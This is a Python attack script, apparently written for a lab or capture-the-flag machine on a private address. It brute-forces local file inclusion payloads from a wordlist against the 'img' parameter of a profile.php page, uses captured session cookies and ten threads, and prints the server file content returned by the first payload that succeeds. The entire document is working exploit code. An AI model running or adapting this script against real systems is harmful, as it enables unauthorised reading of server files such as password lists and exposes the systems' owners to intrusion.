import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading

# Configure according to your request, use Burp to capture it
target_url = "http://10.10.80.218:50000/profile.php"
cookie = {
    "connect.sid": "s%3AK3s0mAl-hyRGj8tamLWrEVg_aDrZmVYh.2%2FI%2FJTXM3YwSuKb37krpyk6UBK%2BfkapcOSAddEDYdtc",
    "PHPSESSID": "vhvouumh46gmkqfgu351ssg2a6"
}
headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Connection": "keep-alive",
    "Upgrade-Insecure-Requests": "1",
    "Priority": "u=0, i"
}

# ------------------------------ config -------------------------

# Configure the Path to wordlist
wordlist_path = "./LFI-pay4passwd.txt"

found_event = threading.Event()  # Per interrompere gli altri thread

# Funzione per testare un singolo payload
def test_payload(index, total, payload):
    if found_event.is_set():
        return None  # Interrompi se già trovato
    print(f"[{index}/{total}] Provo: {payload}")
    try:
        response = requests.get(
            target_url,
            headers=headers,
            cookies=cookie,
            params={"img": payload},
            timeout=5
        )
        if response.status_code == 200 and len(response.content) > 0:
            found_event.set()
            return (payload, response.text)
    except requests.RequestException as e:
        print(f"[!] Errore con payload {payload}: {e}")
    return None

# Caricamento wordlist
with open(wordlist_path, "r") as f:
    payloads = [line.strip() for line in f]

total = len(payloads)
print(f"Totale payload: {total}")

with ThreadPoolExecutor(max_workers=10) as executor:
    futures = {
        executor.submit(test_payload, idx + 1, total, payload): payload
        for idx, payload in enumerate(payloads)
    }
    for future in as_completed(futures):
        result = future.result()
        if result:
            payload, content = result
            print(f"\n[+] Trovato payload valido: {payload}")
            print(content)
            break
